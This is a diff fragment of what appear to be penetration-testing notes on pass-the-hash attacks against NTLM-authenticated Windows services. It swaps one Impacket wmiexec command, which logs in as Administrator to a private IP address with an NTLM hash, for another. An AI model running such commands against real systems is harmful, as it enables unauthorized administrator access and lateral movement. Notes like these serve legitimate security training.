@@ -19,10 +19,10 @@ Pth uses Service Control Manager API
 
 Pth is used against services that use NTLM as authentication (it consists to send NTLM Hash instead of cleartext password). Pth is not possible against services that use Kerberos Authentication.
 
-## From Linux with wmiexec
+## From Linux with wmiexec (from Impacket)
 
 ```
-/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+wmiexec.py -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.229.72
 
 ```
 
